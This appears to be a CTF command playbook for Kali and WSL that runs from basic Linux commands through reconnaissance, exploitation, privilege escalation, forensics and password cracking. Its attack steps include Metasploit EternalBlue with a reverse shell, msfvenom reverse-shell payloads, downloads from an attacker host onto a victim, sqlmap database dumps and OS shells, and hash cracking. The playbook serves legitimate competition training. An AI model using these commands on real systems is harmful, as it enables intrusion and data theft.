# CTF Command Playbook: Kali Linux & Ubuntu on WSL

This playbook provides a comprehensive guide to essential commands and strategies for Capture The Flag (CTF) competitions, tailored for both Kali Linux and Ubuntu on WSL environments. It is structured to follow the typical phases of a cybersecurity engagement.

---

## Essential Linux Commands for CTF

This section covers fundamental Linux commands that are frequently used during CTF competitions for file management, text processing, and system navigation.

### File Management Commands

**Remove Command (`rm`)**
Permanently deletes files and directories. Use with caution as deletion is irreversible.

```bash
# Delete a single file
rm filename.txt

# Delete multiple files
rm file1.txt file2.txt file3.txt

# Interactive mode with confirmation prompts
rm -i filename.txt

# Delete empty directory
rmdir directory_name

# Delete directory and all contents recursively
rm -r directory_name

# Force delete without prompts (use with extreme caution)
rm -rf directory_name

# Delete all files in current directory (keeps subdirectories)
rm *

# Delete everything including subdirectories
rm -r *

# Delete with verbose output to see what's being removed
rm -rv *

# Delete hidden files as well
rm -rv .*
```

**Safety Precautions for `rm`:**
1. Always verify your location with `pwd` before deleting
2. List contents with `ls -al` to see what will be deleted
3. Use interactive mode (`-i`) for important deletions
4. Never use `rm -rf /` - this will delete your entire system!

**Copy Command (`cp`)**
Copies files and directories.

```bash
# Copy a file
cp source.txt destination.txt

# Copy a file to a directory
cp source.txt /path/to/directory/

# Copy directory recursively
cp -r source_dir/ destination_dir/

# Copy with verbose output
cp -v source.txt destination.txt

# Copy preserving permissions and attributes
cp -a source.txt destination.txt
```

**Move Command (`mv`)**
Moves or renames files and directories.

```bash
# Rename a file
mv old_name.txt new_name.txt

# Move a file to a directory
mv file.txt /path/to/directory/

# Move directory
mv source_dir/ /path/to/destination/
```

**Make Directory Command (`mkdir`)**
Creates new directories.

```bash
# Create single directory
mkdir new_directory

# Create nested directories
mkdir -p path/to/nested/directory

# Create multiple directories
mkdir dir1 dir2 dir3
```

**List Command (`ls`)**
Lists directory contents.

```bash
# Basic listing
ls

# Detailed listing with hidden files
ls -la

# Listing with human-readable file sizes
ls -lh

# Listing sorted by modification time (newest first)
ls -lt

# Listing sorted by size (largest first)
ls -lS
```

**Find Command (`find`)**
Searches for files and directories.

```bash
# Find files by name
find /path -name "filename.txt"

# Find files by extension
find /path -name "*.txt"

# Find files larger than 100MB
find /path -size +100M

# Find files modified in last 7 days
find /path -mtime -7

# Find empty files
find /path -empty
```

### Text Processing Commands

**Grep Command (`grep`)**
Searches for patterns in text.

```bash
# Search for a pattern in a file
grep "pattern" file.txt

# Case-insensitive search
grep -i "pattern" file.txt

# Search recursively in directories
grep -r "pattern" /path/to/directory/

# Show line numbers
grep -n "pattern" file.txt

# Show only matching filenames
grep -l "pattern" *.txt

# Invert match (show lines that don't match)
grep -v "pattern" file.txt
```

**Sed Command (`sed`)**
Stream editor for text manipulation.

```bash
# Replace text in file (in-place)
sed -i 's/old_text/new_text/g' file.txt

# Replace and create backup
sed -i.bak 's/old_text/new_text/g' file.txt

# Delete lines containing pattern
sed '/pattern/d' file.txt

# Print specific line numbers
sed -n '1,5p' file.txt
```

**Awk Command (`awk`)**
Pattern scanning and processing language.

```bash
# Print specific columns
awk '{print $1, $3}' file.txt

# Filter lines based on condition
awk '$3 > 100' file.txt

# Sum values in a column
awk '{sum += $3} END {print sum}' file.txt
```

**Cat Command (`cat`)**
Concatenates and displays files.

```bash
# Display file contents
cat file.txt

# Display multiple files
cat file1.txt file2.txt

# Display with line numbers
cat -n file.txt

# Create file from keyboard input
cat > new_file.txt
```

**Less Command (`less`)**
View file contents interactively.

```bash
# View file with scrolling
less file.txt

# Search in less (type /pattern)
# Navigate with arrows, PageUp/Down
# Quit with q
```

**Head and Tail Commands**
Display beginning or end of files.

```bash
# Show first 10 lines
head file.txt

# Show first 20 lines
head -n 20 file.txt

# Show last 10 lines
tail file.txt

# Follow file in real-time
tail -f file.txt
```

### System Information Commands

**Process Status (`ps`)**
Displays running processes.

```bash
# Show all processes
ps aux

# Show processes in tree format
ps auxf

# Show processes for specific user
ps -u username

# Find specific process
ps aux | grep process_name
```

**Top Command (`top`)**
Displays running processes dynamically.

```bash
# Basic top view
top

# Sort by memory usage
top -o %MEM

# Sort by CPU usage
top -o %CPU
```

**Disk Usage (`df` and `du`)**
Shows disk space usage.

```bash
# Show disk usage for all filesystems
df -h

# Show disk usage for current directory
du -h

# Show disk usage for specific directory
du -h /path/to/directory

# Show total size of directory
du -sh /path/to/directory
```

**System Information (`uname`)**
Displays system information.

```bash
# Show all system information
uname -a

# Show kernel name
uname -s

# Show kernel release
uname -r

# Show hardware architecture
uname -m
```

### Network Basic Commands

**Ping Command (`ping`)**
Tests network connectivity.

```bash
# Ping a host
ping google.com

# Send specific number of packets
ping -c 4 google.com

# Flood ping (use with caution)
ping -f target_ip
```

**Curl Command (`curl`)**
Transfers data from servers.

```bash
# Download file
curl -O http://example.com/file.txt

# Download with custom filename
curl -o newname.txt http://example.com/file.txt

# Follow redirects
curl -L http://example.com

# Show headers
curl -I http://example.com

# POST request
curl -X POST -d "data=value" http://example.com
```

**Wget Command (`wget`)**
Downloads files from the web.

```bash
# Download file
wget http://example.com/file.txt

# Download recursively
wget -r http://example.com/

# Continue interrupted download
wget -c http://example.com/largefile.zip
```

**Netstat Command (`netstat`)**
Displays network connections.

```bash
# Show all connections
netstat -a

# Show listening ports
netstat -l

# Show PID/program name
netstat -p

# Show numerical addresses
netstat -n
```

### Permission Commands

**Chmod Command (`chmod`)**
Changes file permissions.

```bash
# Add execute permission
chmod +x script.sh

# Remove write permission for others
chmod o-w file.txt

# Set specific permissions (rwxr-xr-x)
chmod 755 script.sh

# Recursively change permissions
chmod -R 755 directory/
```

**Chown Command (`chown`)**
Changes file ownership.

```bash
# Change owner
chown username file.txt

# Change owner and group
chown username:groupname file.txt

# Recursively change ownership
chown -R username:groupname directory/
```

**Sudo Command (`sudo`)**
Execute commands as superuser.

```bash
# Run command as root
sudo command

# Switch to root user
sudo su

# Edit file as root
sudo nano /etc/hosts

# Run command as different user
sudo -u username command
```

---

## Phase 1: Reconnaissance & Enumeration

This phase focuses on gathering intelligence and mapping the target environment to identify potential attack vectors.

### Network & Service Discovery

**Nmap (`nmap`)**
The cornerstone of network reconnaissance.

```bash
# Host Discovery (Ping Sweep) - Find live hosts on a subnet
nmap -sn 10.10.10.0/24

# TCP SYN Scan (Stealthy) - Default for privileged users
sudo nmap -sS <TARGET_IP>

# TCP Connect Scan - Default for unprivileged users
nmap -sT <TARGET_IP>

# UDP Scan - Slower, for services like DNS, SNMP
sudo nmap -sU <TARGET_IP>

# Aggressive Scan - Enables OS detection (-O), version detection (-sV), script scanning (-sC), and traceroute
nmap -A <TARGET_IP>

# Scan all TCP ports (0-65535)
nmap -p- <TARGET_IP>

# Fast scan with service version, default scripts, and OS detection
nmap -T4 -A 192.168.1.101

# Efficient two-stage scan for all ports
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV -oA results $IP
```

**Masscan (`masscan`)**
For high-speed scanning of large networks.

```bash
# Scan a large subnet for common web ports at high speed
masscan 10.11.0.0/16 -p80,443,8080 --rate 100000 -oL results.txt
```

### Web Application Enumeration

**Gobuster (`gobuster`)**
A versatile tool for brute-forcing directories, files, and subdomains.

```bash
# Directory and file brute-forcing
gobuster dir -u http://192.168.1.102 -w /usr/share/wordlists/dirb/common.txt -x php,txt

# Subdomain enumeration
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Virtual host brute-forcing
gobuster vhost -u http://192.168.1.102 -w /path/to/vhosts.txt
```

**Feroxbuster (`feroxbuster`)**
A powerful alternative with default recursive scanning.

```bash
# Recursive scan, filtering 404s
feroxbuster -u http://target.local -w /usr/share/wordlists/dirb/common.txt -C 404 -t 100
```

**Dirb (`dirb`)**
A classic, simple, and effective recursive scanner.

```bash
# Basic recursive scan
dirb http://192.168.1.103
```

### DNS & Subdomain Discovery

**Dnsrecon (`dnsrecon`)**
A comprehensive script for DNS enumeration.

```bash
# Attempt zone transfer and standard enumeration
dnsrecon -d example.com -t axfr,std
```

**Sublist3r (`sublist3r`)**
An OSINT tool for passive subdomain discovery.

```bash
# Enumerate subdomains using search engines and third-party services
sublist3r -d example.com -o subdomains.txt
```

### Service-Specific Enumeration

**SMB/Samba (Ports 139, 445)**
Use `enum4linux` for comprehensive enumeration.

```bash
# Full enumeration of an SMB host
enum4linux -a 192.168.1.105
```

**NFS (Port 2049)**
Use `showmount` to list exported file systems.

```bash
# List exported directories from an NFS server
showmount -e 192.168.1.106
```

---

## Phase 2: Gaining Initial Access (Exploitation)

This phase involves leveraging identified vulnerabilities to gain a foothold.

### Exploit Identification

**Searchsploit (`searchsploit`)**
An offline interface for the Exploit Database.

```bash
# Search for exploits for a specific software version
searchsploit "Apache Struts 2.0.0"

# Copy an exploit to the current directory for modification
searchsploit -m 41462
```

### Automated Exploitation

**Metasploit Framework (`msfconsole`)**
A modular platform for executing a wide range of exploits.

```bash
# --- msfconsole Workflow ---
# 1. Search for a module
msf6 > search ms17-010

# 2. Select and use the module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Configure options (RHOSTS, LHOST)
msf6 > set RHOSTS 192.168.1.110
msf6 > set LHOST 10.10.14.5

# 4. Set a payload (Meterpreter is recommended)
msf6 > set payload windows/x64/meterpreter/reverse_tcp

# 5. Launch the attack
msf6 > exploit
```

### Web Application Exploitation

**SQLMap (`sqlmap`)**
The definitive tool for SQL injection automation.

```bash
# Test a GET parameter for SQLi
sqlmap -u "http://testsite.com/product.php?id=1"

# Enumerate and dump database contents
sqlmap -u "http://testsite.com/product.php?id=1" --dbs
sqlmap -u "http://testsite.com/product.php?id=1" -D webapp --tables
sqlmap -u "http://testsite.com/product.php?id=1" -D webapp -T users -C username,password --dump

# Gain an OS shell
sqlmap -u "http://testsite.com/product.php?id=1" --os-shell
```

**Commix (`commix`)**
For automating command injection exploitation.

```bash
# Test and exploit a command injection vulnerability
commix --url="http://vulnerable.site/ping.php?addr=8.8.8.8"
```

### Binary Exploitation (Pwn)

**Initial Assessment**

```bash
# Determine file type, architecture, and protections
file ./vuln_binary
checksec ./vuln_binary
strings ./vuln_binary
```

**Dynamic Analysis with GDB**
Use enhancers like GEF, Pwndbg, or Peda.

```bash
# --- Core GDB Commands ---
gdb ./vuln_binary
(gdb) run
(gdb) break main
(gdb) continue
(gdb) nexti
(gdb) x/20wx $rsp

# --- Enhancer Commands ---
# Generate a cyclic pattern to find buffer offset
(gdb) cyclic 500
# Find offset after crash
(gdb) cyclic -l <EIP_VALUE>
```

**Reverse Engineering**

```bash
# Disassemble with objdump
objdump -d -M intel ./vuln_binary

# Analyze with radare2
r2 ./vuln_binary
> aaa  # Analyze all
> afl  # List functions
> pdf @main # Print disassembly of main

# Analyze with Ghidra (GUI-based tool with decompiler)
```

---

## Phase 3: Post-Exploitation & Privilege Escalation

From an initial foothold to complete system control.

### Shell Management

**Msfvenom (`msfvenom`)**
A versatile payload generator.

```bash
# Generate a Linux reverse shell executable
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell

# Generate a Windows Meterpreter reverse shell executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=5555 -f exe -o shell.exe
```

**Netcat (`nc`)**
The essential tool for listening for reverse shells.

```bash
# Start a listener on the attacker machine
nc -lvnp 4444
```

**Upgrading to a Full TTY Shell**

```bash
# 1. Use Python to spawn a better shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background the shell, set terminal raw, and foreground
Ctrl+Z
stty raw -echo; fg

# 3. Reset and set terminal type
reset
export TERM=xterm
```

### File Transfer

**Host a Web Server (Attacker Machine)**

```bash
# In the directory with the files to serve
python3 -m http.server 80
```

**Download Files (Victim Machine)**

```bash
# Using wget
wget http://<ATTACKER_IP>/LinPEAS.sh

# Using curl
curl http://<ATTACKER_IP>/LinPEAS.sh -o LinPEAS.sh
```

### Linux Privilege Escalation

**Automated Enumeration Scripts**

```bash
# LinPEAS (Linux Privilege Escalation Awesome Script)
chmod +x LinPEAS.sh
./LinPEAS.sh

# LinEnum
chmod +x LinEnum.sh
./LinEnum.sh -t
```

**Manual Vectors**

```bash
# Find SUID binaries (check GTFOBins for exploitation)
find / -perm -u=s -type f 2>/dev/null

# Check sudo permissions (check GTFOBins for abuse)
sudo -l

# Check for writable cron jobs
find /etc/cron* -type f -perm -o+w

# Check kernel version for known exploits
uname -a
searchsploit Linux Kernel <version> local
```

---

## Phase 4: Specialized Disciplines

### Digital Forensics & Steganography

**File Carving & Metadata**

```bash
# Read file metadata
exiftool image.jpg

# Find and extract embedded files
binwalk challenge_file.bin
binwalk -e challenge_file.bin

# Recover files from a disk image
foremost -t jpg,pdf -i disk.dd -o output_directory
```

**Steganography**

```bash
# Extract data hidden with steghide (often needs a passphrase)
steghide extract -sf suspicious.jpg

# Detect LSB steganography in PNG/BMP files
zsteg -a image.png
```

**Network & Memory Forensics**

```bash
# Filter a pcap file with tshark
tshark -r traffic.pcap -Y "http.request.method == GET"

# Analyze a memory dump with Volatility 3
volatility -f memdump.vmem windows.pslist
volatility -f memdump.vmem windows.hashdump
```

### Cryptography & Password Cracking

**Hash Identification**

```bash
# Identify hash type
hashid '<HASH_STRING>'
```

**Password Crackers**

```bash
# John the Ripper (CPU-based)
john --wordlist=/usr/share/wordlists/rockyou.txt hash_file.txt
john --show hash_file.txt

# Hashcat (GPU-based, requires mode number)
# Crack an MD5 hash (-m 0) with a dictionary attack
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## WSL-Specific Commands

Tips for the Windows Subsystem for Linux environment.

```bash
# List installed WSL distributions
wsl --list --verbose

# Shutdown all running distributions
wsl --shutdown

# Access Windows files from within WSL (e.g., C: drive)
cd /mnt/c/Users/<YourWindowsUser>/

# Access WSL files from Windows Explorer or Run dialog
\\wsl$\
# Example: \\wsl$\Ubuntu\home\<user>

# Run a Linux command directly from Windows CMD or PowerShell
wsl ls -la